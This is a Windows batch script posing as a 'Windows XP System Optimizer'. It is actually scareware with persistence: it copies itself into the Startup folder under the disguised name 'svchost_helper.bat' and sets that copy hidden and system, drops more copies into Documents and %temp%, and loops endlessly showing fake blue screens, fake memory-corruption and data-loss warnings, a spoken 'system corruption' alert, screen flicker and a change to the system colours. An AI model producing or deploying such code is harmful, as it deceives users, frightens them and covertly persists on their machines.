@echo off
title Windows XP System Optimizer
color 0A
echo ========================================
echo    Windows XP System Optimizer v1.2
echo ========================================
echo.
echo Scanning system for optimization...
ping localhost -n 3 > nul
echo.
echo Found 127 issues to fix!
echo Optimizing system performance...
echo.

:: Скрываем себя и делаем резидентным
copy %0 "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchost_helper.bat" > nul
copy %0 "%userprofile%\Documents\system_help.bat" > nul
attrib +h +s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchost_helper.bat"

:loop
:: Случайный выбор эффекта
set /a effect=%random% %% 7

if %effect%==0 (
    :: Эффект "падающих букв" как в Matrix
    echo [WARNING] Video driver instability detected
    start cmd /c "color 0A & for /l %%i in (1,1,500) do @echo %random% %random% %random% %random% %random%"
)

if %effect%==1 (
    :: Псевдо-синий экран
    echo [CRITICAL] SYSTEM_THREAD_EXCEPTION_NOT_HANDLED
    start cmd /k "color 17 & echo *** STOP: 0x0000007B & echo *** Address 0xFD309004 base at 0xFD308000 DateStamp 0x45aeebc4"
)

if %effect%==2 (
    :: Инвертирование цветов
    powershell -command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class User32 { [DllImport(\"user32.dll\")] public static extern bool SetSysColors(int cElements, int[] lpaElements, int[] lpaRgbValues); }'; $elements = @(1..20); $colors = @(); foreach($i in 1..20) { $colors += [Convert]::ToInt32('FFFFFF', 16) }; [User32]::SetSysColors(20, $elements, $colors)"
    timeout 2 > nul
)

if %effect%==3 (
    :: Ползучее затемнение
    for /l %%i in (1,1,10) do (
        color 0%%i
        timeout 1 > nul
    )
    color 0F
)

if %effect%==4 (
    :: Фейковые ошибки с голосом (если есть SAPI)
    echo Dim sapi > %temp%\speak.vbs
    echo Set sapi=CreateObject("sapi.spvoice") >> %temp%\speak.vbs
    echo sapi.Speak "Warning. System corruption detected." >> %temp%\speak.vbs
    start /min wscript %temp%\speak.vbs
)

if %effect%==5 (
    :: Медленно заполняющийся экран предупреждениями
    setlocal enabledelayedexpansion
    for /l %%i in (1,1,30) do (
        echo [ERROR] Memory sector %%i corrupted. Data loss imminent.
        ping localhost -n 1 > nul
    )
)

if %effect%==6 (
    :: Эффект "мерцающего экрана"
    for /l %%i in (1,1,50) do (
        if %%i%%2==0 (color 0F) else (color 0C)
        ping localhost -n 1 > nul
    )
    color 0A
)

:: Случайная пауза между эффектами 30-60 секунд
set /a delay=30 + %random% %% 31
ping localhost -n %delay% > nul

:: Создаем еще несколько скрытых копий каждые 5 циклов
set /a counter=%counter%+1
if %counter%==5 (
    copy %0 "%temp%\%random%.bat" > nul
    set counter=0
)

goto loop
